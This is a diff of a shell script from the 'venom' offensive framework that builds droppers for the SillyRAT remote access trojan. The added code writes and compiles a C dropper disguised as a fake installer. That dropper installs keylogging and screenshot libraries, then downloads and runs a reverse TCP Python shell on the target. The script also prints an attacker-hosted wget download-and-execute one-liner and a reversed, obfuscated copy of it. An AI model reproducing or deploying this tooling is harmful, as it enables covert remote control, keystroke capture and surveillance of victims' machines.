@@ -10218,25 +10218,24 @@ Colors;
 # ----------------- Dependencies Checks -----------------
 
 
-## Make Sure all dependencies are meet
-# check if mingw32 OR mingw-W64 GCC library exists
+## Make Sure all dependencies are meet (attacker)
+# Check if mingw32 OR mingw-W64 GCC library exists
 echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";sleep 2
 audit=$(which $ComP) > /dev/null 2>&1
 if [ "$?" -ne "0" ]; then
    echo "${RedF}[ERROR] GCC compiler lib not found ($ComP)${white}"
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
    if [ "$ArCh" = "x64" ]; then
-      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
       echo "" && sudo apt-get update -qq && apt-get install -y mingw-w64 && echo ""
       ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
    else
-      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
       echo "" && sudo apt-get update -qq && apt-get install -y mingw32 && echo ""
       ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
    fi
 fi
 
 ## Check if python3 its installed on attacker machine
-audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
+audit=$(python --version > /dev/null 2>&1) > /dev/null 2>&1
 if [ "$?" -ne "0" ]; then
    echo "${RedF}[ERROR] python3 interpreter not found${white}";sleep 2
    echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
@@ -10244,16 +10243,15 @@ if [ "$?" -ne "0" ]; then
    echo "" && sudo apt-get update -qq && apt-get install -y python3 && echo ""
 fi
 
-## Check if 'venomconf' file exists
+## Check if 'venomconf' local file exists
 if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
    cd $IPATH/bin/SillyRAT
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing SillyRAT requirements.";sleep 2
-   echo "" && pip3 install -r requirements.txt && echo ""
+   echo "" && sudo pip3 install -r requirements.txt && echo ""
    ## Write 'venomconf' file to prevent the install function from running again
    echo "venom 'SillyRAT' configuration file" > venomconf
    cd $IPATH
 fi
-
 
 # -------------------------------------------------------
 
@@ -10273,22 +10271,19 @@ if [ -z "$SOSP" ]; then SOSP="windows";fi
 if [ -z "$Drop" ]; then Drop="Steam";fi
 if [ "$SOSP" = "Windows" ]; then
    targetos="$SOSP"
-   dropextension="exe"
    uploadpath="$rpath => (remote)"
    lolbin="Powershell (DownloadFile)"
-   dropperpath="$IPATH/output/$Drop.$dropextension"
+   dropperpath="$IPATH/output/$Drop.exe"
 elif [ "$SOSP" = "Linux" ]; then
    targetos="$SOSP"
-   dropextension="NULL"
    uploadpath="/tmp => (remote)"
    lolbin="wget (DownloadFile)"
    dropperpath="$IPATH/output/$Drop"
 else # Mac or multi-platforms
    lolbin="Direct Download (url)"
    targetos="Multi-Platforms"
-   dropextension="NULL"
-   uploadpath="NULL"
-   dropperpath="NULL"
+   uploadpath="NULL (Client manual execution)"
+   dropperpath="NULL (pure python Client)"
 fi
 
 ## Display final settings to user.
@@ -10296,7 +10291,7 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    TARGETOS : ($targetos distro)
+    TARGETOS : ($targetos distros)
     LOLBin   : $lolbin
     DROPPER  : $dropperpath
     AGENT    : $IPATH/output/$Drop.py
@@ -10308,9 +10303,9 @@ echo "---"
 cd $IPATH/output
 if [ "$SOSP" = "Windows" ]; then
 
-   ## BUILD DROPPER (to download/execute Client.py).
-   # TODO: target system needs to install pip3 install -r requirements.txt ???
-   # TODO: port SillyRAT project (Server/Client) to windows to test it from there (see bugs)
+   ## BUILD DROPPER (Install python3/Download/Execute Client.py)
+   # Remark: Its mandatory the install of python3/pip3 SillyRAT rat
+   # requirements in target system before executing the Client.py remotely.
    echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
    cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
    sed -i "s|LhOsT|$lhost|g" dropper.c
@@ -10318,20 +10313,21 @@ if [ "$SOSP" = "Windows" ]; then
    sed -i "s|FiLNaMe|$Drop|g" dropper.c
    sed -i "s|TempDir|$rpath|g" dropper.c
 
-   ## COMPILING C Program USING mingw32 OR mingw-W64
-   echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
-   # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
+   ## COMPILING C Program USING mingw32 OR mingw-W64 (attacker sellection)
+   echo "${BlueF}[☠]${white} Compiling dropper using GCC mingw"${Reset};sleep 2
+   # Special thanks to astr0baby for mingw32 -mwindows switch :D
    $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
    rm $IPATH/output/dropper.c > /dev/nul 2>&1
 
 elif [ "$SOSP" = "Linux" ]; then
 
-      ## Set Agent (Client.py) execution delay time
-      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 13\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
-      if [ -z "$delayTime" ]; then delayTime="13";fi
+      ## Set Agent (Client.py) execution delay time in seconds (default 30)
+      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 30\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
+      if [ -z "$delayTime" ]; then delayTime="30";fi
 
-      ## BUILD DROPPER (to download/execute Client.py)
+      ## BUILD DROPPER (Install python3/Download/Execute Client.py)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+      echo "${BlueF}[☠]${white} Client.py delay time of: $delayTime (sec)"${Reset};
       echo "#include<stdio.h>" > $Drop.c
       echo "#include<stdlib.h>" >> $Drop.c
       echo "#include<string.h>" >> $Drop.c
@@ -10340,9 +10336,11 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "#include<unistd.h>" >> $Drop.c
       echo "" >> $Drop.c
       echo "/*" >> $Drop.c
-      echo "Author: r00t-3xp10it" >> $Drop.c
-      echo "Framework: venom v1.0.17" >> $Drop.c
-      echo "Function: Faking $Drop install to run Client.py" >> $Drop.c
+      echo "Author: r00t-3xp10it [SSA RedTeam @2020]" >> $Drop.c
+      echo "Framework: Venom v1.0.17 - Multi-OS - Agent nº 5" >> $Drop.c
+      echo "Function: Install python3 SillyRAT requirements before downloading and executing" >> $Drop.c
+      echo "$Drop.py (Client reverse tcp python shell) detach from parent (dropper) process." >> $Drop.c
+      echo "Mandatory dependencies: python3 and pip3 {tabulate pynput psutil pillow pyscreenshot pyinstaller}" >> $Drop.c
       echo "*/" >> $Drop.c
       echo "" >> $Drop.c
       echo "int main()" >> $Drop.c
@@ -10359,15 +10357,13 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "         We are runing in parent process (child its also running)" >> $Drop.c
       echo "         Function: Install python3 and sillyrat requirements" >> $Drop.c
       echo "         */" >> $Drop.c
-      echo "         printf(\"\\\n$Drop v1.0.17 - Linux Installer\\\n\");" >> $Drop.c
-      echo "         printf(\"----------------------------------------\\\n\");" >> $Drop.c
+      echo "         printf(\"\\\n$Drop - 3.10.5 Linux Installer\\\n\");" >> $Drop.c
+      echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
       echo "         /* Display system information onscreen to target user */" >> $Drop.c
-      echo "         sleep(1);system(\"c=\$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \\\"Evironement:\$c\\\"\");" >> $Drop.c
-      echo "         system(\"o=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"Operative system:\$o\\\"\");" >> $Drop.c
-      echo "         system(\"k=\$(hostnamectl | grep 'Machine' | cut -d ':' -f2);echo \\\"Machine ID:\$k\\\"\");" >> $Drop.c
+      echo "         sleep(1);system(\"c=\$(hostnamectl);echo \\\"\$c\\\"\");" >> $Drop.c
+      echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
       echo "" >> $Drop.c
       echo "            /* Install python3 and SillyRAT requirements */" >> $Drop.c
-      echo "            sleep(1);printf(\"Checking $Drop system requirements ..\\\n\");" >> $Drop.c
       echo "            sleep(1);system(\"sudo apt-get update && apt-get install -y python3 && pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller\");" >> $Drop.c
       echo "            printf(\"Done.. ALL $Drop requirements are satisfied.\\\n\");" >> $Drop.c
       echo "" >> $Drop.c
@@ -10383,14 +10379,14 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "      } return 0;" >> $Drop.c
       echo "}" >> $Drop.c
 
-      ## COMPILING C Program USING mingw32 OR mingw-W64
-      echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
+      ## COMPILING C Program USING GCC execstack
+      echo "${BlueF}[☠]${white} Compiling dropper using GCC execstack"${Reset};sleep 2
       gcc -fno-stack-protector -z execstack $Drop.c -o $Drop
       chmod +x $IPATH/output/$Drop > /dev/null 2>&1
       # rm $IPATH/output/$Drop.c > /dev/nul 2>&1
 
 else
-:
+: ## If 'Cancel' OR 'Mac' options sellected => Only Client.py its deliver insted of dropper.
 fi
 
 
@@ -10427,14 +10423,13 @@ cd $IPATH
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---";echo "- ${YellowF}ATTACK VECTORS AVAILABLE TO DELIVER DROPPER${BlueF}"
 echo "- ${YellowF}URL LINK:${BlueF} http://$lhost/MegaUpload.html"
-
 if [ "$SOSP" = "Linux" ]; then
    ## Build 'onelinner' download/execute dropper (obfuscated)
    original_string="sudo /usr/bin/wget -qq http://$lhost/$Drop.zip;unzip $Drop.zip;./$Drop"
    ## Reverse original string (venom attack vector)
    xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
    reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
-   ## Display onelinner option to attacker.
+   ## Display onelinner(s) option(s) to attacker.
    echo "-";echo "- ${YellowF}ONELINER:"${BlueF};
    echo "- $original_string";echo "-"
    echo "- ${YellowF}ONELINER_OBFUSCATED:"${BlueF};
